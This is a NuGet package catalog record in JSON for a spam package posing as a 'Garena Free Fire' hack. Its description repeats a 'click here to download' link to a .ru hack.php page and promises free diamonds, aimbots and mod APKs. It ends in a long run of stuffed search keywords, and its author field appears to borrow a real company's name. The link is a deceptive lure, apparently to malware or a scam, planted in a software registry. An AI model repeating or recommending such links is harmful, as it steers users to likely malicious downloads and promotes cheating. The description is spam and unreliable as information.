{
  "@id": "https://api.nuget.org/v3/catalog0/data/2022.01.26.10.49.11/_garena-free-fire-hack-working-2022-version-vtb.8.2.33.json",
  "@type": [
    "PackageDetails",
    "catalog:Permalink"
  ],
  "authors": "SharpCrafters s.r.o.",
  "catalog:commitId": "e021cafd-fd54-4c61-ba94-f4817ee26410",
  "catalog:commitTimeStamp": "2022-01-26T10:49:11.1986608Z",
  "created": "2022-01-26T10:46:24.88Z",
  "description": "# _Garena Free Fire HacK Working 2022 Version vtb\n\n\nCLICK HERE TO DOWNLOAD  gt;gt;gt;gt;gt; [http://6.bltadwin.ru/hack.php](http://6.bltadwin.ru/hack.php)\n\n\nDownload the latest and best Free Fire Hacks, Mods, Aimbots, Wallhacks, Game Hack Tools, Mod Menus and Cheats on Android and iOS. Learn how to use Garena. Download Free Fire MOD APK or Normal APK from the above link · Also Download OBB File from the same page · Install the apk on your mobile device. Your Garena Free Fire Hack is now complete and the Diamond will be available in your account. About Free Fire Free.\n\n## [CLICK HERE TO DOWNLOAD  gt;gt;gt;gt;gt; http://6.bltadwin.ru/hack.php](http://6.bltadwin.ru/hack.php)\n\n · free diamond and Garena Free Fire diamond/5(3). Garena Free Fire Hack With the arrival of video games like PUBG, this entire category of fight royal video games are coming to be significantly preferred. In this category comes an incredibly popular video game called Garena Free Fire (Which was formerly recognized from a various name of Free Fire- Battlefields).  · Garena Free Fire hacks run the gamut from aimbots to speed hacks, and they’re never much fun to experience as a normal player. That’s why Garena is so strict and puts so much effort into expanding its anti-cheat download: Pocket Tactics.\n\ngarena free fire hack app, garena free fire hack 99.999 free diamond, garena free fire hack download, garena free fire hack ios, garena free fire hacker report, garena free fire hacker apps, garena free fire hack report, garena free fire hacked account recovery, garena free fire hack application, garena free fire hack diamonds and coins, garena free fire hack online generator, garena free fire hack app download, garena free fire hack android, garena free fire hack apk unlimited diamonds, garena free fire hack an1.com, garena free fire hack app ios, garena free fire hack apk 2021, garena free fire hack online generator 99 999 diamond, garena free fire hack generator, garena free fire hack diamond generator, garena free fire hack 2021, garena free fire hack bundle, garena free fire battlegrounds hack, garena free fire aimbot hack, garena free fire hack diamonds 2021 offered by https //freegeneratore4all.blogspot.com/, garena free fire hip hop bundle hack, garena free fire id hack and back, garena free fire hack centre, garena free fire hack cheats online get unlimited coins and diamonds, garena free fire hack coin  diamond generator, garena free fire hack character, garena free fire hack coins, garena free fire cobra hack, garena free fire custom hack, garena free fire car hack, garena free fire hack-get unlimited c, garena free fire hack diamonds 2021, garena free fire hack diamonds 2021 https //freegeneratore4all.blogspot.com/, garena free fire hack download unlimited diamond, garena free fire hack download app, garena free fire emotes hack, garena free fire esp hack, garena free fire event hack, garena free fire esports hacker list, garena free fire hack unlimited everything, garena free fire evolution hack mod apk, garena free fire elite pass hack, garena free fire hack-get unlimited coins and diamonds easily, garena free fire hack free diamond generator, garena free fire hack file, garena free fire hack free diamonds and coins, garena free fire hack for pc, garena free fire fly hack, garena free fire hack download for pc, garena free fire hack version download for pc, garena free fire hack  cheat online for android and ios devices, are there hackers in free fire, is garena free fire free, garena free fire hack get unlimited coins and diamonds, garena free fire hack get unlimited c, garena free fire hack generator 99.999 diamond 2021, garena free fire hack game guardian, garena free fire hack generator 99.999 diamond download, garena free fire hack get, g hack garena free fire, garena free fire hack help center, garena free fire hack headshot, garena free fire hack health, garena free fire headshot hack, garena free fire headshot hack ",
  "id": "_Garena-Free-Fire-HacK-Working-2022-Version-vtb",
  "isPrerelease": false,
  "language": "en-US",
  "lastEdited": "2022-01-26T10:48:57.817Z",
  "listed": true,
  "packageHash": "Dfvuzk7sSb414c0IHWcaIAH7R+3C9/eUUxfGty3hsHjWsrzqwOSe8BqU/tzlbVxyZKQB7OCaaHqSzcyN6nGkcg==",
  "packageHashAlgorithm": "SHA512",
  "packageSize": 11508,
  "published": "2022-01-26T10:46:24.88Z",
  "requireLicenseAcceptance": false,
  "title": "_Garena-Free-Fire-HacK-Working-2022-Version-vtb",
  "verbatimVersion": "8.2.33",
  "version": "8.2.33",
  "packageEntries": [
    {
      "@id": "https://api.nuget.org/v3/catalog0/data/2022.01.26.10.49.11/_garena-free-fire-hack-working-2022-version-vtb.8.2.33.json#xlwsjigfno.nuspec",
      "@type": "PackageEntry",
      "compressedLength": 1379,
      "fullName": "xlwsjigfno.nuspec",
      "length": 4471,
      "name": "xlwsjigfno.nuspec"
    },
    {
      "@id": "https://api.nuget.org/v3/catalog0/data/2022.01.26.10.49.11/_garena-free-fire-hack-working-2022-version-vtb.8.2.33.json#.signature.p7s",
      "@type": "PackageEntry",
      "compressedLength": 9469,
      "fullName": ".signature.p7s",
      "length": 9469,
      "name": ".signature.p7s"
    }
  ],
  "@context": {
    "@vocab": "http://schema.nuget.org/schema#",
    "catalog": "http://schema.nuget.org/catalog#",
    "xsd": "http://www.w3.org/2001/XMLSchema#",
    "dependencies": {
      "@id": "dependency",
      "@container": "@set"
    },
    "dependencyGroups": {
      "@id": "dependencyGroup",
      "@container": "@set"
    },
    "packageEntries": {
      "@id": "packageEntry",
      "@container": "@set"
    },
    "packageTypes": {
      "@id": "packageType",
      "@container": "@set"
    },
    "supportedFrameworks": {
      "@id": "supportedFramework",
      "@container": "@set"
    },
    "tags": {
      "@id": "tag",
      "@container": "@set"
    },
    "vulnerabilities": {
      "@id": "vulnerability",
      "@container": "@set"
    },
    "published": {
      "@type": "xsd:dateTime"
    },
    "created": {
      "@type": "xsd:dateTime"
    },
    "lastEdited": {
      "@type": "xsd:dateTime"
    },
    "catalog:commitTimeStamp": {
      "@type": "xsd:dateTime"
    },
    "reasons": {
      "@container": "@set"
    }
  }
}